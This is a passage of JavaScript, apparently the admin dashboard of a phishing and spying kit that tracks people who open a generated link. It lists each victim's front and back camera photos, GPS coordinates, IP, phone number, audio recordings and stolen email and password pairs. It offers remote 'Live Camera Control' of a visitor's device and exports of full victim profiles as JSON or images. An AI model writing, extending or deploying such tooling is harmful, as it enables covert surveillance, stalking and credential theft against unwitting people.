                ${user.backCamera ? `<img src="${user.backCamera.image || user.backCamera}" style="max-width:60px; border-radius:5px;">` : ''}
            </div>
            ${visitCount > 0 ? `<div style="margin-top:8px; font-size:12px; color:#888;">📋 ${visitCount} visits</div>` : ''}
        `;
        container.appendChild(card);
    });
}

// ============================================
// FILTER FUNCTIONS
// ============================================
function filterVisits(filter) {
    currentFilter = filter;
    displayAllUsers(allUsersData);
    const filterNames = { 'all': 'All', 'today': 'Today', 'yesterday': 'Yesterday', '7days': 'Last 7 Days', '30days': 'Last 30 Days' };
    showNotification(`📅 Filter: ${filterNames[filter] || filter}`);
}

function sortVisits(sort) {
    currentSort = sort;
    displayAllUsers(allUsersData);
    showNotification(`🔄 Sort: ${sort === 'newest' ? 'Newest First' : 'Oldest First'}`);
}

// ============================================
// UPDATE USERS STATS
// ============================================
function updateUsersStats(users) {
    document.getElementById('totalUsers').textContent = users.length;
    let totalVisits = 0;
    const uniqueStates = new Set();
    let activeNow = 0;
    users.forEach(user => {
        totalVisits += (user.totalVisits || 0);
        if (user.location && user.location.state) {
            uniqueStates.add(user.location.state);
        }
        if (user.connected) { activeNow++; }
    });
    document.getElementById('totalVisitsAll').textContent = totalVisits;
    document.getElementById('uniqueLocations').textContent = uniqueStates.size;
    document.getElementById('activeNow').textContent = activeNow;
}

// ============================================
// POPULATE STATE FILTER
// ============================================
function populateStateFilter(users) {
    const states = new Set();
    users.forEach(user => {
        if (user.location && user.location.state) {
            states.add(user.location.state);
        }
    });
    const filter = document.getElementById('filterState');
    const currentValue = filter.value;
    filter.innerHTML = '<option value="">All States</option>';
    states.forEach(state => {
        filter.innerHTML += `<option value="${state}">${state}</option>`;
    });
    filter.value = currentValue;
}

// ============================================
// SEARCH USERS
// ============================================
function searchUsers() {
    const query = document.getElementById('searchUsers').value.toLowerCase().trim();
    const stateFilter = document.getElementById('filterState').value;
    const cards = document.querySelectorAll('#allUsersList .visitor-card');
    let visibleCount = 0;
    cards.forEach(card => {
        const text = card.textContent.toLowerCase();
        let show = true;
        if (query && !text.includes(query)) { show = false; }
        if (stateFilter) {
            const userState = text.match(/📍\s*([^,]+)/);
            if (userState && userState[1] && userState[1].trim() !== stateFilter) { show = false; }
        }
        card.style.display = show ? 'block' : 'none';
        if (show) visibleCount++;
    });
    document.getElementById('userCount').textContent = `(${visibleCount} users)`;
}

// ============================================
// CLEAR FILTERS
// ============================================
function clearFilters() {
    document.getElementById('searchUsers').value = '';
    document.getElementById('filterState').value = '';
    currentFilter = 'all';
    currentSort = 'newest';
    searchUsers();
    showNotification('🧹 Filters cleared');
}

// ============================================
// SHOW USER DETAILS
// ============================================
function showUserDetails(userId) {
    currentVisitorId = userId;
    const container = document.getElementById('detailsContent');
    const detailsDiv = document.getElementById('visitorDetails');
    
    fetch(`/api/visitor/${userId}`)
        .then(response => response.json())
        .then(user => {
            detailsDiv.style.display = 'block';
            
            let visitHistoryHTML = '';
            if (user.visitHistory && user.visitHistory.length > 0) {
                visitHistoryHTML = '<h4 style="margin-top:15px;">📋 Visit History</h4><div style="max-height:200px; overflow-y:auto;">';
                user.visitHistory.forEach((visit, index) => {
                    const visitDate = visit.visitDate ? new Date(visit.visitDate).toLocaleString() : 'N/A';
                    const visitLoc = visit.location ? `${visit.location.city || ''} ${visit.location.state || ''}` : 'N/A';
                    visitHistoryHTML += `
                        <div style="padding:8px; border-bottom:1px solid #eee; font-size:13px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:5px;">
                            <div>
                                <strong>#${index + 1}</strong> 
                                📅 ${visitDate} 
                                ${visit.ip ? `• 🌐 ${visit.ip}` : ''}
                                ${visitLoc !== 'N/A' ? `• 📍 ${visitLoc}` : ''}
                                ${visit.battery ? `• 🔋 ${visit.battery}%` : ''}
                                ${visit.phoneNumber ? `• 📞 ${visit.phoneNumber}` : ''}
                            </div>
                            <div>
                                <button onclick="showVisitDetails('${userId}', ${index})" class="camera-btn" style="background:#667eea; padding:3px 10px; font-size:12px;">👁️ View</button>
                                <button onclick="deleteVisit('${userId}', ${index})" class="camera-btn" style="background:#fc8181; padding:3px 10px; font-size:12px;">🗑️</button>
                                <button onclick="downloadVisitImage('${userId}', ${index})" class="camera-btn" style="background:#48bb78; padding:3px 10px; font-size:12px;">📥 Image</button>
                                <button onclick="exportVisitData('${userId}', ${index})" class="camera-btn" style="background:#667eea; padding:3px 10px; font-size:12px;">📤 Export</button>
                            </div>
                        </div>
                    `;
                });
                visitHistoryHTML += '</div>';
            } else {
                visitHistoryHTML = '<p style="color:#999;">No visit history available</p>';
            }
            
            const frontPhoto = user.frontCamera || null;
            const backPhoto = user.backCamera || null;
            
            let frontPhotoHTML = '';
            if (frontPhoto) {
                const imgSrc = frontPhoto.image || frontPhoto;
                const captureDate = frontPhoto.captureDate ? new Date(frontPhoto.captureDate).toLocaleString() : 'Unknown';
                const location = frontPhoto.location ? `${frontPhoto.location.city || ''}, ${frontPhoto.location.state || ''}, ${frontPhoto.location.country || ''}` : 'Not available';
                const coords = frontPhoto.location ? `${frontPhoto.location.lat || 'N/A'}, ${frontPhoto.location.lng || 'N/A'}` : 'N/A';
                frontPhotoHTML = `
                    <div style="display:inline-block; margin:8px; padding:12px; background:rgba(255,255,255,0.05); border-radius:12px; border:1px solid rgba(255,255,255,0.08);">
                        <p><strong>📸 Front Camera</strong> <span style="font-size:11px; color:#888;">#1</span></p>
                        <img src="${imgSrc}" class="camera-image">
                        <div style="font-size:11px; color:rgba(255,255,255,0.5); margin-top:6px;">
                            📅 ${captureDate}<br>
                            📍 ${location} <button onclick="copyToClipboard('${location}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button><br>
                            📍 Coordinates: ${coords} <button onclick="copyToClipboard('${coords}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button>
                        </div>
                        <div style="margin-top:6px; display:flex; gap:5px; flex-wrap:wrap;">
                            <button onclick="downloadPhoto('${imgSrc}', 'front-camera.jpg')" class="camera-btn" style="background:#48bb78; padding:3px 8px; font-size:11px;">⬇️ Download</button>
                            <button onclick="deletePhoto('${userId}', 'front')" class="camera-btn" style="background:#fc8181; padding:3px 8px; font-size:11px;">🗑️ Delete</button>
                        </div>
                    </div>
                `;
            } else {
                frontPhotoHTML = '<p style="color:#999;">No front photo</p>';
            }
            
            let backPhotoHTML = '';
            if (backPhoto) {
                const imgSrc = backPhoto.image || backPhoto;
                const captureDate = backPhoto.captureDate ? new Date(backPhoto.captureDate).toLocaleString() : 'Unknown';
                const location = backPhoto.location ? `${backPhoto.location.city || ''}, ${backPhoto.location.state || ''}, ${backPhoto.location.country || ''}` : 'Not available';
                const coords = backPhoto.location ? `${backPhoto.location.lat || 'N/A'}, ${backPhoto.location.lng || 'N/A'}` : 'N/A';
                backPhotoHTML = `
                    <div style="display:inline-block; margin:8px; padding:12px; background:rgba(255,255,255,0.05); border-radius:12px; border:1px solid rgba(255,255,255,0.08);">
                        <p><strong>📸 Back Camera</strong> <span style="font-size:11px; color:#888;">#2</span></p>
                        <img src="${imgSrc}" class="camera-image">
                        <div style="font-size:11px; color:rgba(255,255,255,0.5); margin-top:6px;">
                            📅 ${captureDate}<br>
                            📍 ${location} <button onclick="copyToClipboard('${location}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button><br>
                            📍 Coordinates: ${coords} <button onclick="copyToClipboard('${coords}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button>
                        </div>
                        <div style="margin-top:6px; display:flex; gap:5px; flex-wrap:wrap;">
                            <button onclick="downloadPhoto('${imgSrc}', 'back-camera.jpg')" class="camera-btn" style="background:#48bb78; padding:3px 8px; font-size:11px;">⬇️ Download</button>
                            <button onclick="deletePhoto('${userId}', 'back')" class="camera-btn" style="background:#fc8181; padding:3px 8px; font-size:11px;">🗑️ Delete</button>
                        </div>
                    </div>
                `;
            } else {
                backPhotoHTML = '<p style="color:#999;">No back photo</p>';
            }
            
            // Saved Passwords
            let savedPasswordsHTML = '';
            if (user.savedPasswords && user.savedPasswords.length > 0) {
                savedPasswordsHTML = '<div class="visitor-details-grid">';
                user.savedPasswords.forEach(pwd => {
                    savedPasswordsHTML += `
                        <div class="detail-card">
                            <label>📧 Email <button onclick="copyToClipboard('${pwd.email || 'Unknown'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                            <div class="value">${pwd.email || 'Unknown'}</div>
                            <label style="margin-top:5px;">🔑 Password <button onclick="copyToClipboard('${pwd.password || 'Unknown'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                            <div class="value">${pwd.password || 'Unknown'}</div>
                        </div>
                    `;
                });
                savedPasswordsHTML += '</div>';
            }
            
            // Screen Time
            let screenTimeHTML = '';
            if (user.screenTime) {
                screenTimeHTML = `
                    <div class="visitor-details-grid">
                        <div class="detail-card">
                            <label>🔋 Battery Level</label>
                            <div class="value">${user.screenTime.batteryLevel || 'N/A'}%</div>
                        </div>
                        <div class="detail-card">
                            <label>⚡ Charging</label>
                            <div class="value">${user.screenTime.charging ? 'Yes' : 'No'}</div>
                        </div>
                    </div>
                `;
            }
            
            // Audio Recording
            let audioHTML = '';
            if (user.audioRecording) {
                audioHTML = `
                    <div class="detail-card">
                        <label>🎙️ Audio Recording</label>
                        <div class="value">
                            <audio controls style="width:100%; max-width:300px;">
                                <source src="${user.audioRecording}" type="audio/webm">
                            </audio>
                            <br>
                            <button onclick="downloadAudio('${user.audioRecording}', 'audio-${user.id}.webm')" class="camera-btn" style="background:#48bb78; padding:3px 10px; font-size:11px;">⬇️ Download</button>
                        </div>
                    </div>
                `;
            }
            
            let html = `
                <div style="display:grid; grid-template-columns:1fr 1fr; gap:20px;">
                    <div>
                        <h3>👤 User Information</h3>
                        <div class="visitor-details-grid">
                            <div class="detail-card">
                                <label>🆔 ID <button onclick="copyToClipboard('${user.id}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                <div class="value">${user.id}</div>
                            </div>
                            <div class="detail-card">
                                <label>🔗 Link ID <button onclick="copyToClipboard('${user.linkId || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                <div class="value">${user.linkId || 'N/A'}</div>
                            </div>
                            <div class="detail-card">
                                <label>📱 Device <button onclick="copyToClipboard('${user.deviceName || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                <div class="value">${user.deviceName || 'N/A'}</div>
                            </div>
                            <div class="detail-card">
                                <label>💻 OS <button onclick="copyToClipboard('${user.os || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                <div class="value">${user.os || 'N/A'}</div>
                            </div>
                            <div class="detail-card">
                                <label>🌍 Browser <button onclick="copyToClipboard('${user.browser || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                <div class="value">${user.browser || 'N/A'}</div>
                            </div>
                            <div class="detail-card">
                                <label>🌐 IP Address <button onclick="copyToClipboard('${user.ip || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                <div class="value">${user.ip || 'N/A'}</div>
                            </div>
                            <div class="detail-card">
                                <label>📶 Network <button onclick="copyToClipboard('${user.network?.effectiveType || user.network?.type || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                <div class="value">${user.network?.effectiveType || user.network?.type || 'N/A'}</div>
                            </div>
                            <div class="detail-card">
                                <label>🔋 Battery <button onclick="copyToClipboard('${user.battery || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                <div class="value">${user.battery || 'N/A'}%</div>
                            </div>
                            <div class="detail-card">
                                <label>📅 First Visit <button onclick="copyToClipboard('${user.visitDate ? new Date(user.visitDate).toLocaleString() : 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                <div class="value">${user.visitDate ? new Date(user.visitDate).toLocaleString() : 'N/A'}</div>
                            </div>
                            <div class="detail-card">
                                <label>🔄 Total Visits <button onclick="copyToClipboard('${user.totalVisits || 0}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                <div class="value">${user.totalVisits || 0}</div>
                            </div>
                            <div class="detail-card">
                                <label>📅 Last Visit <button onclick="copyToClipboard('${user.lastVisit ? new Date(user.lastVisit).toLocaleString() : 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                <div class="value">${user.lastVisit ? new Date(user.lastVisit).toLocaleString() : 'N/A'}</div>
                            </div>
                            <div class="detail-card">
                                <label>🟢 Status</label>
                                <div class="value">${user.connected ? 'Online' : 'Offline'}</div>
                            </div>
                            ${user.phoneNumber ? `
                            <div class="detail-card">
                                <label>📞 Phone Number <button onclick="copyToClipboard('${user.phoneNumber}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                <div class="value">${user.phoneNumber}</div>
                            </div>` : ''}
                        </div>
                        ${visitHistoryHTML}
                        
                        <h3 style="margin-top:15px;">🔑 Saved Passwords</h3>
                        ${savedPasswordsHTML || '<p style="color:#999;">No saved passwords found</p>'}
                        
                        <h3 style="margin-top:15px;">📱 Screen Time</h3>
                        ${screenTimeHTML || '<p style="color:#999;">Screen time data not available</p>'}
                        
                        <h3 style="margin-top:15px;">🎙️ Audio Recording</h3>
                        ${audioHTML || '<p style="color:#999;">No audio recording available</p>'}
                        
                        <div style="margin-top:15px; display:flex; gap:10px; flex-wrap:wrap;">
                            <button onclick="downloadAllVisitorData('${user.id}')" class="camera-btn" style="background:#48bb78; padding:8px 16px;">📥 Download All Data</button>
                            <button onclick="exportVisitorData('${user.id}')" class="camera-btn" style="background:#667eea; padding:8px 16px;">📤 Export as Image</button>
                            <button onclick="copyToClipboard('${JSON.stringify(user, null, 2)}')" class="camera-btn" style="background:#ed8936; padding:8px 16px;">📋 Copy JSON</button>
                        </div>
                    </div>
                    <div>
                        <h3>📍 Location</h3>
                        ${user.location ? `
                            <div class="visitor-details-grid">
                                <div class="detail-card">
                                    <label>🌍 Country <button onclick="copyToClipboard('${user.location.country || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                    <div class="value">${user.location.country || 'N/A'}</div>
                                </div>
                                <div class="detail-card">
                                    <label>🏛️ State <button onclick="copyToClipboard('${user.location.state || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                    <div class="value">${user.location.state || 'N/A'}</div>
                                </div>
                                <div class="detail-card">
                                    <label>🏙️ City <button onclick="copyToClipboard('${user.location.city || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                    <div class="value">${user.location.city || 'N/A'}</div>
                                </div>
                                <div class="detail-card">
                                    <label>📍 Coordinates <button onclick="copyToClipboard('${user.location.lat || 'N/A'}, ${user.location.lng || 'N/A'}')" class="camera-btn" style="background:#48bb78; padding:2px 6px; font-size:9px;">Copy</button></label>
                                    <div class="value">${user.location.lat || 'N/A'}, ${user.location.lng || 'N/A'}</div>
                                </div>
                            </div>
                        ` : '<p style="color:#999;">Location not available</p>'}
                        
                        <h3 style="margin-top:20px;">📸 Photos</h3>
                        <div style="display:flex; gap:20px; flex-wrap:wrap;">
                            ${frontPhotoHTML}
                            ${backPhotoHTML}
                        </div>
                        
                        <div style="margin-top:20px; border-top:1px solid rgba(255,255,255,0.1); padding-top:15px;">
                            <h3>📸 Live Camera Control</h3>
                            <p style="font-size:12px; color:rgba(255,255,255,0.5);">Capture live photos from visitor's device</p>
                            <div style="display:flex; gap:8px; flex-wrap:wrap; margin-top:10px;">
                                <button onclick="captureVisitorPhoto('front')" class="camera-btn" style="background:#48bb78; padding:6px 14px; font-size:13px;">📷 Capture Front</button>
                                <button onclick="captureVisitorPhoto('back')" class="camera-btn" style="background:#4299e1; padding:6px 14px; font-size:13px;">📷 Capture Back</button>
                                <button onclick="captureVisitorPhoto('both')" class="camera-btn" style="background:#ed8936; padding:6px 14px; font-size:13px;">📷 Capture Both</button>
                            </div>
                            <div id="captureStatus" style="margin-top:10px; font-size:13px; color:#666;"></div>
                        </div>
                    </div>
                </div>
            `;
            container.innerHTML = html;
        });
}

// ============================================
// DOWNLOAD VISIT IMAGE
// ============================================
function downloadVisitImage(userId, visitIndex) {
    fetch(`/api/visitor/${userId}`)
        .then(response => response.json())
        .then(user => {
            const visit = user.visitHistory[visitIndex];
            if (!visit) {
                alert('Visit not found');
                return;
            }
            
            const canvas = document.createElement('canvas');
            canvas.width = 600;
            canvas.height = 500;
            const ctx = canvas.getContext('2d');
            
            const gradient = ctx.createLinearGradient(0, 0, 600, 500);
            gradient.addColorStop(0, '#0f0c29');
            gradient.addColorStop(0.5, '#302b63');
            gradient.addColorStop(1, '#24243e');
            ctx.fillStyle = gradient;
            ctx.fillRect(0, 0, 600, 500);
            
            ctx.fillStyle = '#ffffff';
            ctx.font = 'bold 22px Arial';
            ctx.fillText('📋 Visit Details', 30, 45);
            
            ctx.fillStyle = '#667eea';
            ctx.font = '12px Arial';
            ctx.fillText(`Visit #${visitIndex + 1} • ${new Date(visit.visitDate).toLocaleString()}`, 30, 70);
            
            const details = [
                ['🆔 ID', visit.visitId || 'N/A'],
                ['📱 Device', visit.deviceInfo?.deviceName || visit.deviceInfo?.platform || 'N/A'],
                ['💻 OS', visit.deviceInfo?.os || 'N/A'],
                ['🌍 Browser', visit.deviceInfo?.browser || 'N/A'],
                ['🌐 IP', visit.ip || 'N/A'],
                ['📶 Network', visit.network?.effectiveType || visit.network?.type || 'N/A'],
                ['🔋 Battery', visit.battery || 'N/A' + '%'],
                ['📍 Location', visit.location ? `${visit.location.city || ''} ${visit.location.state || ''} ${visit.location.country || ''}` : 'N/A'],
                ['📍 Coordinates', visit.location ? `${visit.location.lat || 'N/A'}, ${visit.location.lng || 'N/A'}` : 'N/A'],
                ['📞 Phone', visit.phoneNumber || 'N/A'],
                ['🔄 Redirect', visit.redirectComplete ? '✅ Yes' : '❌ No']
            ];
            
            ctx.fillStyle = 'rgba(255,255,255,0.8)';
            ctx.font = '13px Arial';
            details.forEach(([label, value], i) => {
                ctx.fillStyle = 'rgba(255,255,255,0.5)';
                ctx.font = 'bold 12px Arial';
                ctx.fillText(label, 30, 100 + i * 25);
                ctx.fillStyle = 'rgba(255,255,255,0.8)';
                ctx.font = '12px Arial';
                ctx.fillText(value, 130, 100 + i * 25);
            });
            
            let yPos = 380;
            let photosLoaded = 0;
            const totalPhotos = (visit.frontCamera ? 1 : 0) + (visit.backCamera ? 1 : 0);
            
            const drawPhoto = (imgSrc, label, y) => {
                const img = new Image();
                img.onload = function() {
                    ctx.fillStyle = '#ffffff';
                    ctx.font = 'bold 12px Arial';
                    ctx.fillText(label, 30, y);
                    ctx.drawImage(img, 30, y + 5, 120, 90);
                    yPos += 110;
                    photosLoaded++;
                    if (photosLoaded >= totalPhotos || totalPhotos === 0) {
                        ctx.fillStyle = 'rgba(255,255,255,0.2)';
                        ctx.font = '10px Arial';
                        ctx.fillText('Generated by Admin Panel • ' + new Date().toLocaleString(), 30, 470);
                        const link = document.createElement('a');
                        link.download = `visit-${userId}-${visitIndex}.png`;
                        link.href = canvas.toDataURL('image/png');
                        link.click();
                        showNotification('📥 Visit image downloaded!');
                    }
                };
                img.src = imgSrc;
            };
            
            if (visit.frontCamera) {
                drawPhoto(visit.frontCamera.image || visit.frontCamera, '📸 Front Camera', 370);
            }
            if (visit.backCamera) {
                drawPhoto(visit.backCamera.image || visit.backCamera, '📸 Back Camera', 370 + (visit.frontCamera ? 110 : 0));
            }
            
            if (totalPhotos === 0) {
                ctx.fillStyle = 'rgba(255,255,255,0.3)';
                ctx.font = '12px Arial';
                ctx.fillText('No photos available', 30, 390);
                ctx.fillStyle = 'rgba(255,255,255,0.2)';
                ctx.font = '10px Arial';
                ctx.fillText('Generated by Admin Panel • ' + new Date().toLocaleString(), 30, 470);
                const link = document.createElement('a');
                link.download = `visit-${userId}-${visitIndex}.png`;
                link.href = canvas.toDataURL('image/png');
                link.click();
                showNotification('📥 Visit image downloaded!');
            }
        });
}

// ============================================
// EXPORT VISIT DATA AS IMAGE
// ============================================
function exportVisitData(userId, visitIndex) {
    fetch(`/api/visitor/${userId}`)
        .then(response => response.json())
        .then(user => {
            const visit = user.visitHistory[visitIndex];
            if (!visit) {
                alert('Visit not found');
                return;
            }
            
            const canvas = document.createElement('canvas');
            canvas.width = 800;
            canvas.height = 650;
            const ctx = canvas.getContext('2d');
            
            const gradient = ctx.createLinearGradient(0, 0, 800, 650);
            gradient.addColorStop(0, '#0f0c29');
            gradient.addColorStop(0.5, '#302b63');
            gradient.addColorStop(1, '#24243e');
            ctx.fillStyle = gradient;
            ctx.fillRect(0, 0, 800, 650);
            
            ctx.fillStyle = '#ffffff';
            ctx.font = 'bold 28px Arial';
            ctx.fillText('📊 Visit Data Report', 30, 50);
            
            ctx.fillStyle = '#667eea';
            ctx.font = '14px Arial';
            ctx.fillText(`Visit #${visitIndex + 1} • Generated: ${new Date().toLocaleString()}`, 30, 75);
            
            ctx.fillStyle = '#ffffff';
            ctx.font = 'bold 16px Arial';
            ctx.fillText('📋 Visit Information', 30, 110);
            
            const details = [
                ['Visit ID', visit.visitId || 'N/A'],
                ['Date', new Date(visit.visitDate).toLocaleString()],
                ['Device', visit.deviceInfo?.deviceName || visit.deviceInfo?.platform || 'N/A'],
                ['OS', visit.deviceInfo?.os || 'N/A'],
                ['Browser', visit.deviceInfo?.browser || 'N/A'],
                ['IP Address', visit.ip || 'N/A'],
                ['Network', visit.network?.effectiveType || visit.network?.type || 'N/A'],
                ['Battery', visit.battery || 'N/A' + '%'],
                ['Phone Number', visit.phoneNumber || 'N/A'],
                ['Location', visit.location ? `${visit.location.city || ''} ${visit.location.state || ''} ${visit.location.country || ''}` : 'N/A'],
                ['Coordinates', visit.location ? `${visit.location.lat || 'N/A'}, ${visit.location.lng || 'N/A'}` : 'N/A'],
                ['Redirect Complete', visit.redirectComplete ? '✅ Yes' : '❌ No']
            ];
            
            ctx.fillStyle = 'rgba(255,255,255,0.7)';
            ctx.font = '13px Arial';
            details.forEach(([label, value], i) => {
                const col = i < 6 ? 0 : 1;
                const row = i % 6;
                const x = 40 + col * 380;
                const y = 140 + row * 30;
                ctx.fillStyle = 'rgba(255,255,255,0.3)';
                ctx.font = '11px Arial';
                ctx.fillText(label + ':', x, y);
                ctx.fillStyle = 'rgba(255,255,255,0.8)';
                ctx.font = '12px Arial';
                ctx.fillText(value, x + 100, y);
            });
            
            let yPos = 340;
            let photosLoaded = 0;
            const totalPhotos = (visit.frontCamera ? 1 : 0) + (visit.backCamera ? 1 : 0);
            
            const drawPhoto = (imgSrc, label, y) => {
                const img = new Image();
                img.onload = function() {
                    ctx.fillStyle = '#ffffff';
                    ctx.font = 'bold 14px Arial';
                    ctx.fillText(label, 30, y);
                    
                    const maxWidth = 180;
                    const maxHeight = 180;
                    let width = img.width;
                    let height = img.height;
                    if (width > maxWidth) { height = (height * maxWidth) / width; width = maxWidth; }
                    if (height > maxHeight) { width = (width * maxHeight) / height; height = maxHeight; }
                    
                    ctx.drawImage(img, 40, y + 5, width, height);
                    photosLoaded++;
                    if (photosLoaded >= totalPhotos || totalPhotos === 0) {
                        ctx.fillStyle = 'rgba(255,255,255,0.2)';
                        ctx.font = '12px Arial';
                        ctx.fillText('Generated by Admin Panel • Data exported on ' + new Date().toLocaleString(), 30, 620);
                        const link = document.createElement('a');
                        link.download = `visit-${userId}-${visitIndex}-report.png`;
                        link.href = canvas.toDataURL('image/png');
                        link.click();
                        showNotification('📤 Visit data exported as image!');
                    }
                };
                img.src = imgSrc;
            };
            
            if (visit.frontCamera) {
                drawPhoto(visit.frontCamera.image || visit.frontCamera, '📸 Front Camera', 320);
            }
            if (visit.backCamera) {
                drawPhoto(visit.backCamera.image || visit.backCamera, '📸 Back Camera', 520);
            }
            
            if (totalPhotos === 0) {
                ctx.fillStyle = 'rgba(255,255,255,0.3)';
                ctx.font = '14px Arial';
                ctx.fillText('No photos available', 40, 360);
                ctx.fillStyle = 'rgba(255,255,255,0.2)';
                ctx.font = '12px Arial';
                ctx.fillText('Generated by Admin Panel • Data exported on ' + new Date().toLocaleString(), 30, 620);
                const link = document.createElement('a');
                link.download = `visit-${userId}-${visitIndex}-report.png`;
                link.href = canvas.toDataURL('image/png');
                link.click();
                showNotification('📤 Visit data exported as image!');
            }
        });
}

// ============================================
// DOWNLOAD ALL VISITOR DATA
// ============================================
function downloadAllVisitorData(userId) {
    fetch(`/api/visitor/${userId}`)
        .then(response => response.json())
        .then(user => {
            const dataStr = JSON.stringify(user, null, 2);
            const blob = new Blob([dataStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `visitor-${userId}-data.json`;
            a.click();
            URL.revokeObjectURL(url);
            showNotification('📥 Data downloaded successfully!');
        });
}

// ============================================
// EXPORT VISITOR DATA AS IMAGE
// ============================================
function exportVisitorData(userId) {
    fetch(`/api/visitor/${userId}`)
        .then(response => response.json())
        .then(user => {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 800;
            canvas.height = 700;
            
            const gradient = ctx.createLinearGradient(0, 0, 800, 700);
            gradient.addColorStop(0, '#0f0c29');
            gradient.addColorStop(0.5, '#302b63');
            gradient.addColorStop(1, '#24243e');
            ctx.fillStyle = gradient;
            ctx.fillRect(0, 0, 800, 700);
            
            ctx.fillStyle = '#ffffff';
            ctx.font = 'bold 28px Arial';
            ctx.fillText('📊 Visitor Data Report', 30, 50);
            ctx.fillStyle = '#667eea';
            ctx.font = '14px Arial';
            ctx.fillText(`Generated: ${new Date().toLocaleString()}`, 30, 75);
            
            ctx.fillStyle = '#ffffff';
            ctx.font = 'bold 18px Arial';
            ctx.fillText('👤 User Information', 30, 110);
            
            const info = [
                `ID: ${user.id}`,
                `Device: ${user.deviceName || 'N/A'}`,
                `IP: ${user.ip || 'N/A'}`,
                `Location: ${user.location ? `${user.location.city || ''} ${user.location.state || ''} ${user.location.country || ''}` : 'N/A'}`,
                `Coordinates: ${user.location ? `${user.location.lat || 'N/A'}, ${user.location.lng || 'N/A'}` : 'N/A'}`,
                `Battery: ${user.battery || 'N/A'}%`,
                `Network: ${user.network?.effectiveType || user.network?.type || 'N/A'}`,
                `Visits: ${user.totalVisits || 0}`,
                `First Visit: ${user.visitDate ? new Date(user.visitDate).toLocaleString() : 'N/A'}`,
                `Phone: ${user.phoneNumber || 'N/A'}`
            ];
            
            ctx.fillStyle = 'rgba(255,255,255,0.8)';
            ctx.font = '13px Arial';
            info.forEach((line, i) => {
                ctx.fillText(line, 40, 140 + i * 22);
            });
            
            let yPos = 350;
            let photosLoaded = 0;
            const totalPhotos = (user.frontCamera ? 1 : 0) + (user.backCamera ? 1 : 0);
            
            const drawPhoto = (imgSrc, label, y) => {
                const img = new Image();
                img.onload = function() {
                    ctx.fillStyle = '#ffffff';
                    ctx.font = 'bold 14px Arial';
                    ctx.fillText(label, 30, y);
                    
                    const maxWidth = 150;
                    const maxHeight = 150;
                    let width = img.width;
                    let height = img.height;
                    if (width > maxWidth) { height = (height * maxWidth) / width; width = maxWidth; }
                    if (height > maxHeight) { width = (width * maxHeight) / height; height = maxHeight; }
                    
                    ctx.drawImage(img, 40, y + 5, width, height);
                    photosLoaded++;
                    if (photosLoaded >= totalPhotos || totalPhotos === 0) {
                        ctx.fillStyle = 'rgba(255,255,255,0.3)';
                        ctx.font = '12px Arial';
                        ctx.fillText('Generated by Admin Panel • Data exported on ' + new Date().toLocaleString(), 30, 670);
                        const link = document.createElement('a');
                        link.download = `visitor-${user.id}-report.png`;
                        link.href = canvas.toDataURL('image/png');
                        link.click();
                        showNotification('📤 Image exported successfully!');
                    }
                };
                img.src = imgSrc;
            };
            
            if (user.frontCamera) {
                drawPhoto(user.frontCamera.image || user.frontCamera, '📸 Front Camera', 320);
            }
            if (user.backCamera) {
                drawPhoto(user.backCamera.image || user.backCamera, '📸 Back Camera', 480);
            }
            
            if (!user.frontCamera && !user.backCamera) {
                ctx.fillStyle = 'rgba(255,255,255,0.5)';
                ctx.font = '14px Arial';
                ctx.fillText('No photos available', 40, 360);
                ctx.fillStyle = 'rgba(255,255,255,0.3)';
                ctx.font = '12px Arial';
                ctx.fillText('Generated by Admin Panel • Data exported on ' + new Date().toLocaleString(), 30, 670);
                const link = document.createElement('a');
                link.download = `visitor-${user.id}-report.png`;
                link.href = canvas.toDataURL('image/png');
                link.click();
                showNotification('📤 Image exported successfully!');
            }
        });
}

// ============================================
// DELETE PHOTO
// ============================================
function deletePhoto(userId, type) {
    if (!confirm(`Delete ${type} photo permanently?`)) return;
    fetch(`/api/visitor/${userId}/photo/${type}`, { method: 'DELETE' })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                showNotification('🗑️ Photo deleted successfully!');
                showUserDetails(userId);
                refreshAllData();
            }
        })
        .catch(error => {
            alert('Error: ' + error.message);
        });
}

// ============================================
// SHOW VISIT DETAILS
// ============================================
function showVisitDetails(userId, visitIndex) {
    fetch(`/api/visitor/${userId}`)
        .then(response => response.json())
        .then(user => {
            const visit = user.visitHistory[visitIndex];
            if (!visit) {
                alert('Visit not found');
                return;
            }
